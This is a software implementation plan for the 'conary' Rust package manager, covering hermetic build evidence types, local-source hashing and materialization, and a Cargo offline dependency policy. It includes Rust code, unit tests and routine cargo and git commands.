# M2a Hermetic Publish Foundation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the M2a foundation that lets `conary cook --isolated` and project-form `conary publish <target>` produce honest hermetic evidence while keeping artifact-form publish gated off until M2b signed build attestations.

**Architecture:** Add a focused `recipe/hermetic` module for unsigned hermetic evidence, source identity, builder environment identity, ecosystem policy, command-risk reports, reproducibility controls, and local-source materialization. Keep Kitchen as the builder, but split fetch and offline build with an explicit source-download policy so a hermetic build cannot silently fetch during `prep()`. M2a may produce `hardening_level = "hermetic"` only when the build uses pristine/no-host-mount execution and records the builder environment identity; if implementation cannot satisfy that gate, keep the artifact `sandboxed` and record offline evidence without calling it hermetic. Keep publish and cook command modules as thin orchestrators; M2a must not embed build-attestation envelopes or unlock `conary publish <pkg.ccs> <target>`.

**Tech Stack:** Rust 2024, serde/toml/serde_json, existing Kitchen/CCS/static-repo code, existing `ccs::convert::command_evidence` extraction helpers, `git` for local tracked-file identity, Cargo offline mode for the first accepted ecosystem path, and existing `apps/conary/tests` CLI integration patterns.

---

## Rollout Gate

M2a is a foundation slice. It may emit unsigned hermetic evidence in CCS provenance, and it may make project-form publish use the hermetic build path, but it must not mark artifacts as attested and must not unlock artifact-form publish.

Before Task 1 starts, this plan must be committed as a tracked, docs-audit-registered document. During implementation, each task ends in a small commit. The final M2a merge point must prove:

- `conary cook --isolated` uses the hermetic path and refuses when static evidence is missing.
- `conary cook --no-isolation` keeps the host-build iteration path.
- Project-form `conary publish <target>` uses hermetic Kitchen execution but still prints that M2b attestation gates are not present.
- `conary publish <pkg.ccs> <target>` still refuses with the artifact-form M2 attestation message.
- No signed build-attestation envelope exists in M2a output.

## Scope

In scope:

- Unsigned hermetic evidence structs for recipe identity, source identity, additional source identity, dependency lock, builder environment identity, ecosystem policy, command-risk reports, reproducibility record, and local tree identity.
- A narrow `ccs::manifest` provenance-type split if needed before adding M2a evidence fields.
- Local source hashing from the canonical file list and materialization from that same list.
- Git local source policy: tracked files define the content identity; CI mode refuses dirty trees.
- Non-git local source policy: hash a documented file list with default ignored directories and record a weaker identity warning.
- Source prefetch and offline cache-only build split.
- Cargo ecosystem policy as the first accepted path.
- Go, npm, and Python fail-closed diagnostics for hermetic mode unless a later task in this plan explicitly accepts a concrete offline policy.
- Recipe command and converted PKGBUILD command-risk classification for package-manager fetches, network fetches, dynamic language execution, credential paths, obfuscation, persistence hooks, eBPF/BPF, and debugger/proc-hiding signals.
- Reproducibility environment controls: `SOURCE_DATE_EPOCH`, path remapping, enforcement that recipe environment cannot erase required remaps, and a recorded reproducibility record.
- `hardening_level = "hermetic"` only when M2a hermetic gates pass, including pristine/no-host-mount build execution.

Out of scope:

- Signed `BuildAttestationEnvelope`.
- Artifact-form publish.
- Foreign package ingestion through `conary cook <foreign-pkg>`.
- Remi push.
- New static-repo trust model.
- Malware scanning or benign-payload claims.
- Full dependency resolver snapshot locking beyond the serializable M2a `DependencyLock` record populated from recipe/build metadata available in this slice.

## Current Repo Facts

- `apps/conary/src/commands/publish.rs` rejects artifact-form publish when `target` is present.
- `apps/conary/src/commands/publish.rs::publish_kitchen_config` currently sets `allow_network = true`, `use_isolation = true`, and `pristine_mode = false`; M2a must change project-form publish to pristine/no-host-mount execution before emitting `hardening_level = "hermetic"`.
- `apps/conary/src/commands/cook.rs` currently rejects the hidden `--hermetic` flag and treats `--isolated` as sandboxed isolation.
- `KitchenConfig::default()` already has `allow_network = false` and `use_isolation = true`, but `Kitchen::cook()` can still download missing sources during `prep()` because `fetch_source()` downloads on cache miss.
- `pristine_mode = true` is the existing Kitchen/container route for no-host-mount execution; non-pristine isolated builds bind host `/usr`, `/lib`, `/bin`, and similar paths and must not be labeled hermetic.
- `Kitchen::fetch()` and `Kitchen::sources_cached()` live in `crates/conary-core/src/recipe/kitchen/mod.rs`; there is no separate fetch module.
- Isolated local sources are currently copied recursively by `copy_dir_contents()` in `crates/conary-core/src/recipe/kitchen/cook.rs`.
- `ManifestProvenance` currently lives inside `crates/conary-core/src/ccs/manifest.rs`, which is already over 1500 lines.
- The existing `ccs::convert::command_evidence` module extracts shell command invocations from scriptlet text, but its generic text extractor is private.
- M1b inference emits Cargo commands with `--locked` when `Cargo.lock` exists, but not `--offline`.
- M1b inference warns that npm, Python, and Go may resolve over the network.

## Ownership Boundaries

- `crates/conary-core/src/ccs/manifest.rs` remains the root CCS TOML schema owner. If M2a needs new provenance fields, first split the provenance structs to `crates/conary-core/src/ccs/manifest_provenance.rs` and re-export them from `ccs::manifest` so existing imports keep working.
- `crates/conary-core/src/recipe/hermetic/` owns M2a evidence, policy, and diagnostics. It must not become a builder.
- `crates/conary-core/src/recipe/kitchen/` owns build execution and source preparation. If local-source code grows, move canonical materialization helpers to `crates/conary-core/src/recipe/kitchen/local_source.rs`.
- `apps/conary/src/commands/cook.rs` and `apps/conary/src/commands/publish.rs` stay orchestration layers. They select host, sandboxed, or hermetic config and print diagnostics; they do not own policy classification.
- `crates/conary-core/src/ccs/attestation.rs` is reserved for M2b signed attestation work. M2a must not add a signed envelope there.
- Every new Rust source file starts with the repository path comment required by `AGENTS.md`, for example `// conary-core/src/recipe/hermetic/evidence.rs`.

## File Map

Create:

- `crates/conary-core/src/recipe/hermetic/mod.rs` - public M2a hermetic API hub.
- `crates/conary-core/src/recipe/hermetic/evidence.rs` - unsigned evidence structs, serialization, stable schema version constants, and builder environment identity.
- `crates/conary-core/src/recipe/hermetic/source_identity.rs` - local tree hash, archive identity, patch identity, dirty-tree policy, CI detection.
- `crates/conary-core/src/recipe/hermetic/ecosystem.rs` - Cargo offline policy plus fail-closed Go/npm/Python diagnostics.
- `crates/conary-core/src/recipe/hermetic/command_risk.rs` - build command scanner and risk report.
- `crates/conary-core/src/recipe/hermetic/reproducibility.rs` - reproducibility env and path remapping helpers.
- `crates/conary-core/src/recipe/hermetic/plan.rs` - `HermeticBuildPlan` assembly from recipe, `HermeticBuildInput`, Kitchen config, and command-risk reports.
- `crates/conary-core/src/recipe/kitchen/local_source.rs` - canonical local-source materialization from hashed file lists.
- `apps/conary/tests/packaging_m2a.rs` - CLI integration coverage for hermetic cook and publish behavior.

Modify:

- `crates/conary-core/src/recipe/mod.rs` - export `hermetic`.
- `crates/conary-core/src/recipe/kitchen/mod.rs` - add source-download policy and hermetic entrypoints.
- `crates/conary-core/src/recipe/kitchen/config.rs` - add `SourceDownloadPolicy` and hermetic config fields.
- `crates/conary-core/src/recipe/kitchen/cook.rs` - use canonical local-source materialization, inject reproducibility env, record hermetic hardening, and keep build execution in Kitchen.
- `crates/conary-core/src/recipe/kitchen/provenance_capture.rs` - carry hardening override and M2a hermetic evidence into manifest provenance.
- `crates/conary-core/src/recipe/inference/detectors.rs` - make inferred Cargo commands explicit offline when Cargo policy evidence supports it.
- `crates/conary-core/src/recipe/pkgbuild.rs` - expose converted build-body text for M2a risk reports or add a small helper returning function bodies.
- `crates/conary-core/src/ccs/convert/command_evidence.rs` - expose a generic shell-text invocation extractor.
- `crates/conary-core/src/container/analysis.rs` - classify package-manager fetches and dynamic language execution as at least `Medium` for `--sandbox=auto`.
- `crates/conary-core/src/ccs/manifest.rs` - re-export split provenance types and keep schema validation.
- `crates/conary-core/src/ccs/mod.rs` - add `manifest_provenance` module if Task 1 performs the split.
- `apps/conary/src/commands/cook.rs` - route `--isolated` and hidden `--hermetic` through M2a hermetic planning.
- `apps/conary/src/commands/publish.rs` - use project-form hermetic publish config and keep artifact-form rejection.
- `apps/conary/src/cli/mod.rs` - update help tests only if public wording changes; keep `--hermetic` hidden.
- `docs/ARCHITECTURE.md`, `docs/modules/recipe.md`, `docs/modules/ccs.md`, `docs/modules/feature-ownership.md`, `docs/llms/subsystem-map.md` - update after behavior lands.
- `docs/superpowers/documentation-accuracy-audit-inventory.tsv`, `docs/superpowers/documentation-accuracy-audit-ledger.tsv` - register this plan and later implementation doc changes.

## Checkpoints

- Checkpoint 1 after Task 4: manifest provenance split, hermetic evidence structs, source identity, and canonical local-source materialization pass unit tests.
- Checkpoint 2 after Task 7: ecosystem policy, command-risk report, source-download policy, and reproducibility controls pass core tests.
- Checkpoint 3 after Task 10: `cook --isolated` and project-form publish use hermetic planning; artifact-form publish remains rejected; targeted CLI tests pass.
- Checkpoint 4 after Task 11: docs routing, docs-audit gates, package tests, fmt, and clippy pass.

---

### Task 1: Split Manifest Provenance Types

**Files:**
- Create: `crates/conary-core/src/ccs/manifest_provenance.rs`
- Modify: `crates/conary-core/src/ccs/manifest.rs`
- Modify: `crates/conary-core/src/ccs/mod.rs`
- Test: existing `crates/conary-core/src/ccs/manifest.rs` tests

- [ ] **Step 1: Move the provenance structs without changing serialized output**

Move these existing items from `manifest.rs` into `manifest_provenance.rs`:

```rust
use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct ManifestProvenance {
    #[serde(default)]
    pub upstream_url: Option<String>,
    #[serde(default)]
    pub upstream_hash: Option<String>,
    #[serde(default)]
    pub git_commit: Option<String>,
    #[serde(default)]
    pub fetch_timestamp: Option<String>,
    #[serde(default)]
    pub patches: Vec<ProvenancePatch>,
    #[serde(default)]
    pub recipe_hash: Option<String>,
    #[serde(default)]
    pub build_timestamp: Option<String>,
    #[serde(default)]
    pub host_arch: Option<String>,
    #[serde(default)]
    pub host_kernel: Option<String>,
    #[serde(default)]
    pub build_deps: Vec<ProvenanceDep>,
    #[serde(default)]
    pub origin_class: Option<String>,
    #[serde(default)]
    pub hardening_level: Option<String>,
    #[serde(default)]
    pub signatures: Vec<ProvenanceSignature>,
    #[serde(default)]
    pub rekor_log_index: Option<u64>,
    #[serde(default)]
    pub sbom_spdx: Option<String>,
    #[serde(default)]
    pub merkle_root: Option<String>,
    #[serde(default)]
    pub dna_hash: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProvenancePatch {
    #[serde(default)]
    pub url: Option<String>,
    pub hash: String,
    #[serde(default)]
    pub author: Option<String>,
    #[serde(default)]
    pub reason: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProvenanceDep {
    pub name: String,
    pub version: String,
    #[serde(default)]
    pub dna_hash: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProvenanceSignature {
    pub keyid: String,
    pub sig: String,
    #[serde(default = "default_sig_scope")]
    pub scope: String,
    #[serde(default)]
    pub timestamp: Option<String>,
}

fn default_sig_scope() -> String {
    "build".to_string()
}
```

In `ccs/mod.rs`, add:

```rust
pub mod manifest_provenance;
```

In `manifest.rs`, add near the imports:

```rust
pub use crate::ccs::manifest_provenance::{
    ManifestProvenance, ProvenanceDep, ProvenancePatch, ProvenanceSignature,
};
```

- [ ] **Step 2: Run manifest tests**

Run:

```bash
cargo test -p conary-core ccs::manifest
```

Expected: tests pass; no import sites need to change because `ccs::manifest::*` still re-exports the moved types.

- [ ] **Step 3: Check the manifest file size moved in the right direction**

Run:

```bash
wc -l crates/conary-core/src/ccs/manifest.rs crates/conary-core/src/ccs/manifest_provenance.rs
```

Expected: `manifest.rs` has fewer lines than before the task, and the new file contains only provenance types.

- [ ] **Step 4: Commit**

```bash
git add crates/conary-core/src/ccs/manifest.rs crates/conary-core/src/ccs/manifest_provenance.rs crates/conary-core/src/ccs/mod.rs
git commit -m "refactor(ccs): split manifest provenance types"
```

---

### Task 2: Add Unsigned Hermetic Evidence Types

**Files:**
- Create: `crates/conary-core/src/recipe/hermetic/mod.rs`
- Create: `crates/conary-core/src/recipe/hermetic/evidence.rs`
- Modify: `crates/conary-core/src/recipe/mod.rs`
- Modify: `crates/conary-core/src/ccs/manifest_provenance.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/provenance_capture.rs`
- Test: `crates/conary-core/src/recipe/hermetic/evidence.rs`

- [ ] **Step 1: Write evidence serialization tests**

Add tests in `evidence.rs`:

```rust
#[test]
fn hermetic_evidence_serializes_stable_schema_version() {
    let evidence = HermeticBuildEvidence {
        schema_version: HERMETIC_EVIDENCE_SCHEMA_V1,
        build_input: BuildInputIdentity {
            recipe: RecipeIdentity::ExplicitRecipe {
                path: "recipe.toml".to_string(),
                hash: "sha256:recipe".to_string(),
            },
            source: SourceIdentity::Archive {
                url: "https://example.invalid/pkg.tar.gz".to_string(),
                checksum: "sha256:source".to_string(),
            },
            additional_sources: Vec::new(),
            patches: Vec::new(),
            local_tree: None,
            ecosystem_dependencies: Vec::new(),
            builder_environment: BuilderEnvironmentIdentity {
                kind: BuilderEnvironmentKind::Pristine,
                sysroot_hash: Some("sha256:sysroot".to_string()),
                toolchain_hash: None,
                diagnostics: Vec::new(),
            },
        },
        dependency_lock: DependencyLock::default(),
        ecosystem_policy: EcosystemPolicyReport::clean("cargo"),
        command_risk: BuildCommandRiskReport::clean(),
        reproducibility: ReproducibilityRecord {
            source_date_epoch: Some(1),
            path_remap_count: 1,
            env_keys: vec!["SOURCE_DATE_EPOCH".to_string()],
        },
        diagnostics: Vec::new(),
    };

    let json = serde_json::to_value(&evidence).unwrap();
    assert_eq!(json["schema_version"], 1);
    assert_eq!(json["build_input"]["source"]["kind"], "archive");
    assert_eq!(json["ecosystem_policy"]["status"], "clean");
    assert_eq!(json["command_risk"]["status"], "clean");
}
```

- [ ] **Step 2: Implement the evidence API**

Use this data shape:

```rust
pub const HERMETIC_EVIDENCE_SCHEMA_V1: u32 = 1;
pub const COMMAND_RISK_CLASSIFIER_VERSION: &str = "m2a-command-risk-v1";

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct HermeticBuildEvidence {
    pub schema_version: u32,
    pub build_input: BuildInputIdentity,
    pub dependency_lock: DependencyLock,
    pub ecosystem_policy: EcosystemPolicyReport,
    pub command_risk: BuildCommandRiskReport,
    pub reproducibility: ReproducibilityRecord,
    pub diagnostics: Vec<String>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct BuildInputIdentity {
    pub recipe: RecipeIdentity,
    pub source: SourceIdentity,
    #[serde(default)]
    pub additional_sources: Vec<SourceArchiveIdentity>,
    #[serde(default)]
    pub patches: Vec<InputFileIdentity>,
    #[serde(default)]
    pub local_tree: Option<LocalTreeIdentity>,
    #[serde(default)]
    pub ecosystem_dependencies: Vec<EcosystemDependencyIdentity>,
    pub builder_environment: BuilderEnvironmentIdentity,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
#[serde(tag = "kind", rename_all = "kebab-case")]
pub enum RecipeIdentity {
    ExplicitRecipe { path: String, hash: String },
    GeneratedRecipe { generator: String, canonical_hash: String, inference_trace_hash: String },
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
#[serde(tag = "kind", rename_all = "kebab-case")]
pub enum SourceIdentity {
    Archive { url: String, checksum: String },
    Git { original: String, commit: String },
    LocalTree { root_display: String, tree_hash: String },
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct SourceArchiveIdentity {
    pub url: String,
    pub checksum: String,
    pub extracted: bool,
    pub target: Option<String>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct LocalTreeIdentity {
    pub tree_hash: String,
    pub file_count: usize,
    pub mode: LocalTreeMode,
    pub dirty: bool,
    pub warnings: Vec<String>,
}

#[derive(Debug, Clone, Copy, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum LocalTreeMode {
    GitTracked,
    FilesystemWalk,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct InputFileIdentity {
    pub path: String,
    pub hash: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct EcosystemDependencyIdentity {
    pub ecosystem: String,
    pub evidence_path: String,
    pub evidence_hash: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct BuilderEnvironmentIdentity {
    pub kind: BuilderEnvironmentKind,
    pub sysroot_hash: Option<String>,
    pub toolchain_hash: Option<String>,
    pub diagnostics: Vec<String>,
}

#[derive(Debug, Clone, Copy, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum BuilderEnvironmentKind {
    Pristine,
    HostMounted,
}

#[derive(Debug, Clone, Default, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct DependencyLock {
    #[serde(default)]
    pub repository_dependencies: Vec<LockedRepositoryDependency>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct LockedRepositoryDependency {
    pub repository_url: String,
    pub snapshot_version: String,
    pub package: String,
    pub version: String,
    pub release: String,
    pub architecture: Option<String>,
    pub content_identity: String,
}
```

Also add `PolicyStatus`, `EcosystemPolicyReport`, `BuildCommandRiskReport`, `BuildCommandRiskEntry`, and `ReproducibilityRecord` in the same file. Use `status: PolicyStatus` with serialized values `clean`, `review`, and `blocked`.

Define the report DTOs completely in Task 2 so later tasks compile against a stable API:

```rust
#[derive(Debug, Clone, Copy, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum PolicyStatus {
    Clean,
    Review,
    Blocked,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct EcosystemPolicyReport {
    pub ecosystem: String,
    pub status: PolicyStatus,
    pub identities: Vec<EcosystemDependencyIdentity>,
    pub diagnostics: Vec<String>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct BuildCommandRiskReport {
    pub status: PolicyStatus,
    pub classifier_version: String,
    pub entries: Vec<BuildCommandRiskEntry>,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct BuildCommandRiskEntry {
    pub phase: String,
    pub command: String,
    pub reason_code: String,
    pub severity: PolicyStatus,
    pub evidence: String,
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, PartialEq, Eq)]
pub struct ReproducibilityRecord {
    pub source_date_epoch: Option<i64>,
    pub path_remap_count: usize,
    pub env_keys: Vec<String>,
}
```

Add `EcosystemPolicyReport::clean(ecosystem: impl Into<String>)` and `BuildCommandRiskReport::clean()` constructors, because later tasks use those helpers in tests.

- [ ] **Step 3: Attach evidence to manifest provenance**

Add this field to `ManifestProvenance` in `manifest_provenance.rs`:

```rust
#[serde(default, skip_serializing_if = "Option::is_none")]
pub hermetic_evidence: Option<crate::recipe::hermetic::HermeticBuildEvidence>,
```

Update every `ManifestProvenance { ... }` literal, including `ProvenanceCapture::to_manifest_provenance()`, to include:

```rust
hermetic_evidence: None,
```

- [ ] **Step 4: Export the module**

In `recipe/mod.rs`, add:

```rust
pub mod hermetic;
```

In `recipe/hermetic/mod.rs`, export:

```rust
pub mod evidence;

pub use evidence::{
    BuildCommandRiskEntry, BuildCommandRiskReport, BuildInputIdentity, BuilderEnvironmentIdentity,
    BuilderEnvironmentKind, DependencyLock, EcosystemDependencyIdentity, EcosystemPolicyReport,
    HermeticBuildEvidence, InputFileIdentity, LocalTreeIdentity, LocalTreeMode, PolicyStatus,
    RecipeIdentity, ReproducibilityRecord, SourceArchiveIdentity, SourceIdentity,
    COMMAND_RISK_CLASSIFIER_VERSION, HERMETIC_EVIDENCE_SCHEMA_V1,
};
```

- [ ] **Step 5: Run tests**

Run:

```bash
cargo test -p conary-core recipe::hermetic::evidence
cargo test -p conary-core ccs::manifest
cargo test -p conary-core recipe::kitchen::provenance_capture
```

Expected: evidence tests pass and existing manifest serialization tests still pass.

- [ ] **Step 6: Commit**

```bash
git add crates/conary-core/src/recipe crates/conary-core/src/ccs/manifest_provenance.rs crates/conary-core/src/ccs/manifest.rs crates/conary-core/src/recipe/kitchen/provenance_capture.rs
git commit -m "feat(packaging): add unsigned hermetic evidence model"
```

---

### Task 3: Implement Source Identity And Local Tree Materialization

**Files:**
- Create: `crates/conary-core/src/recipe/hermetic/source_identity.rs`
- Create: `crates/conary-core/src/recipe/kitchen/local_source.rs`
- Modify: `crates/conary-core/src/recipe/hermetic/mod.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/mod.rs`
- Modify: `crates/conary-core/src/recipe/kitchen/cook.rs`
- Test: `crates/conary-core/src/recipe/hermetic/source_identity.rs`
- Test: `crates/conary-core/src/recipe/kitchen/local_source.rs`

- [ ] **Step 1: Write source identity tests**

Add tests proving the exact file-list behavior:

```rust
#[test]
fn git_tracked_identity_excludes_untracked_files() {
    let fixture = GitTreeFixture::new();
    fixture.write("tracked.txt", "tracked\n");
    fixture.git(["add", "tracked.txt"]);
    fixture.git(["commit", "-m", "tracked"]);
    fixture.write("untracked.txt", "untracked\n");

    let identity = local_tree_identity(fixture.root(), CiMode::Off).unwrap();

    assert_eq!(identity.mode, LocalTreeMode::GitTracked);
    assert_eq!(identity.file_count, 1);
    assert!(identity.warnings.iter().any(|warning| warning.contains("untracked")));
}

#[test]
fn ci_mode_refuses_dirty_git_tree() {
    let fixture = GitTreeFixture::new();
    fixture.write("tracked.txt", "tracked\n");
    fixture.git(["add", "tracked.txt"]);
    fixture.git(["commit", "-m", "tracked"]);
    fixture.write("tracked.txt", "changed\n");

    let error = local_tree_identity(fixture.root(), CiMode::On).unwrap_err();

    assert!(error.to_string().contains("dirty local tree"));
}

#[test]
fn materialization_copies_only_hashed_files() {
    let fixture = GitTreeFixture::new();
    fixture.write("tracked.txt", "tracked\n");
    fixture.git(["add", "tracked.txt"]);
    fixture.git(["commit", "-m", "tracked"]);
    fixture.write("untracked.txt", "untracked\n");
    let destination = fixture.root().join("out");

    let file_list = canonical_local_file_list(fixture.root(), CiMode::Off).unwrap();
    materialize_local_source_from_file_list(fixture.root(), &destination, &file_list).unwrap();

    assert!(destination.join("tracked.txt").is_file());
    assert!(!destination.join("untracked.txt").exists());
}
```

Define `GitTreeFixture` inside the test module with `git init`, local user/email config, `write()`, and `git()` helpers.

- [ ] **Step 2: Implement canonical file listing and hashing**

Implement:

```rust
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CiMode {
    On,
    Off,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CanonicalLocalFile {
    pub relative_path: std::path::PathBuf,
    pub hash: String,
    pub kind: CanonicalLocalFileKind,
    pub mode: Option<u32>,
    pub symlink_target: Option<std::path::PathBuf>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CanonicalLocalFileKind {
    Regular,
    Symlink,
}

pub fn detect_ci_mode() -> CiMode {
    match std::env::var("CONARY_HERMETIC_CI").as_deref() {
        Ok("1" | "true" | "yes") => CiMode::On,
        _ if std::env::var_os("CI").is_some() => CiMode::On,
        _ => CiMode::Off,
    }
}

pub fn canonical_local_file_list(root: &Path, ci_mode: CiMode) -> Result<Vec<CanonicalLocalFile>>;
pub fn local_tree_identity(root: &Path, ci_mode: CiMode) -> Result<LocalTreeIdentity>;
```

For git repositories, use `git -C <root> ls-files -z` for the hashed file list and `git -C <root> status --porcelain=v1 --untracked-files=normal` for dirty/untracked diagnostics. In CI mode, any non-empty status output is an error. Outside CI mode, tracked modified files are hashed from the working tree and untracked files produce a warning.

For non-git directories, walk recursively, skip this documented default ignore set, hash file contents, sort by relative path, and record a warning that filesystem-walk identity is weaker than git-tracked identity:

```text
.git
.conary
dist
target
node_modules
__pycache__
.venv
build
out
```

Do not ignore `vendor/` by default, because M2a Cargo vendor identity may deliberately need that tree. Add tests proving each default ignored entry is excluded and `vendor/` is included when present.

- [ ] **Step 3: Implement canonical materialization**

Move the existing recursive local-source copy out of `cook.rs` and replace it with:

```rust
pub fn materialize_local_source_from_file_list(
    source_root: &Path,
    destination: &Path,
    files: &[CanonicalLocalFile],
) -> Result<()> {
    std::fs::create_dir_all(destination)?;
    for file in files {
        validate_relative_materialization_path(&file.relative_path)?;
        let source = source_root.join(&file.relative_path);
        let dest = destination.join(&file.relative_path);
        if let Some(parent) = dest.parent() {
            std::fs::create_dir_all(parent)?;
        }
        verify_file_identity_before_materialization(source_root, &source, file)?;
        match file.kind {
            CanonicalLocalFileKind::Regular => {
                std::fs::copy(&source, &dest)?;
            }
            CanonicalLocalFileKind::Symlink => {
                let target = std::fs::read_link(&source)?;
                validate_symlink_target_stays_inside_root(source_root, &source, &target)?;
                std::os::unix::fs::symlink(target, &dest)?;
            }
        }
    }
    Ok(())
}
```

The materializer must:

- Reject absolute paths and any relative path containing `..`.
- Recompute and compare `CanonicalLocalFile.hash` immediately before materialization so source bytes cannot drift after planning.
- Preserve safe symlinks instead of following them as regular files.
- Reject symlinks whose resolved target escapes `source_root` using the existing "Local source symlink must stay within the source directory" style error.

Add tests:

```rust
#[test]
fn materialization_refuses_hash_mismatch_after_planning() { /* mutate a tracked file after listing */ }

#[test]
fn materialization_rejects_parent_or_absolute_paths() { /* build a malicious CanonicalLocalFile */ }

#[test]
fn materialization_rejects_symlink_escape() { /* tracked symlink points outside root */ }

#[test]
fn materialization_preserves_safe_symlink() { /* tracked symlink points inside root */ }
```

- [ ] **Step 4: Wire Kitchen isolated local sources through canonical materialization**

Add to `KitchenConfig`:

```rust
pub hermetic_local_files: Option<Vec<crate::recipe::hermetic::source_identity::CanonicalLocalFile>>,
```

In `Cook::prep()`, when the recipe has `SourceSection::Local` and `use_isolation` is true:

- If `hermetic_local_files` is present, call `materialize_local_source_from_file_list()`.
- If it is absent, retain the existing M1 recursive copy path for non-hermetic isolated builds.

- [ ] **Step 5: Run tests**

Run:

```bash
cargo test -p conary-core recipe::hermetic::source_identity
cargo test -p conary-core recipe::kitchen::local_source
cargo test -p conary-core recipe::kitchen::cook
```

Expected: new source identity/materialization tests pass and existing local-source Kitchen tests still pass.

- [ ] **Step 6: Commit**

```bash
git add crates/conary-core/src/recipe/hermetic crates/conary-core/src/recipe/kitchen
git commit -m "feat(packaging): hash and materialize hermetic local sources"
```

---

### Task 4: Add Ecosystem Offline Policy

**Files:**
- Create: `crates/conary-core/src/recipe/hermetic/ecosystem.rs`
- Modify: `crates/conary-core/src/recipe/hermetic/mod.rs`
- Modify: `crates/conary-core/src/recipe/inference/detectors.rs`
- Test: `crates/conary-core/src/recipe/hermetic/ecosystem.rs`
- Test: `crates/conary-core/src/recipe/inference/detectors.rs`

- [ ] **Step 1: Write ecosystem policy tests**

Add tests:

```rust
#[test]
fn cargo_without_lock_is_blocked() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(root.path().join("Cargo.toml"), "[package]\nname=\"a\"\nversion=\"0.1.0\"\n").unwrap();

    let report = evaluate_ecosystem_policy(BuildSystem::Cargo, root.path(), "cargo build --release").unwrap();

    assert_eq!(report.status, PolicyStatus::Blocked);
    assert!(report.diagnostics.iter().any(|d| d.contains("Cargo.lock")));
}

#[test]
fn cargo_lock_with_no_registry_dependencies_is_clean_when_offline_flag_present() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(root.path().join("Cargo.lock"), "# This file is automatically @generated by Cargo.\nversion = 4\n").unwrap();

    let report = evaluate_ecosystem_policy(BuildSystem::Cargo, root.path(), "cargo build --release --locked --offline").unwrap();

    assert_eq!(report.status, PolicyStatus::Clean);
    assert!(report.identities.iter().any(|identity| identity.evidence_path == "Cargo.lock"));
}

#[test]
fn cargo_registry_dependency_without_vendor_identity_is_blocked() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(root.path().join("Cargo.lock"), "source = \"registry+https://github.com/rust-lang/crates.io-index\"\n").unwrap();

    let report = evaluate_ecosystem_policy(BuildSystem::Cargo, root.path(), "cargo build --release --locked --offline").unwrap();

    assert_eq!(report.status, PolicyStatus::Blocked);
    assert!(report.diagnostics.iter().any(|d| d.contains("vendor")));
}

#[test]
fn cargo_registry_dependency_with_vendor_identity_is_recorded() {
    let root = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(root.path().join("vendor/dep")).unwrap();
    std::fs::write(root.path().join("Cargo.lock"), "source = \"registry+https://github.com/rust-lang/crates.io-index\"\n").unwrap();
    std::fs::write(root.path().join("vendor/dep/lib.rs"), "pub fn dep() {}\n").unwrap();
    std::fs::create_dir_all(root.path().join(".cargo")).unwrap();
    std::fs::write(root.path().join(".cargo/config.toml"), "[net]\noffline = true\n[source.crates-io]\nreplace-with = \"vendored-sources\"\n[source.vendored-sources]\ndirectory = \"vendor\"\n").unwrap();

    let report = evaluate_ecosystem_policy(BuildSystem::Cargo, root.path(), "cargo build --release --locked").unwrap();

    assert_eq!(report.status, PolicyStatus::Clean);
    assert!(report.identities.iter().any(|identity| identity.evidence_path == "vendor"));
    assert!(report.identities.iter().any(|identity| identity.evidence_path == ".cargo/config.toml"));
}

#[test]
fn cargo_lock_without_offline_flag_is_blocked() {
    let root = tempfile::tempdir().unwrap();
    std::fs::write(root.path().join("Cargo.lock"), "version = 4\n").unwrap();

    let report = evaluate_ecosystem_policy(BuildSystem::Cargo, root.path(), "cargo build --release --locked").unwrap();

    assert_eq!(report.status, PolicyStatus::Blocked);
    assert!(report.diagnostics.iter().any(|d| d.contains("--offline")));
}

#[test]
fn npm_python_and_go_are_fail_closed_until_policy_is_explicit() {
    for build_system in [BuildSystem::Npm, BuildSystem::Python, BuildSystem::Go] {
        let root = tempfile::tempdir().unwrap();
        let report = evaluate_ecosystem_policy(build_system, root.path(), "true").unwrap();
        assert_eq!(report.status, PolicyStatus::Blocked);
        assert!(report.diagnostics.iter().any(|d| d.contains("M2a hermetic support")));
    }
}
```

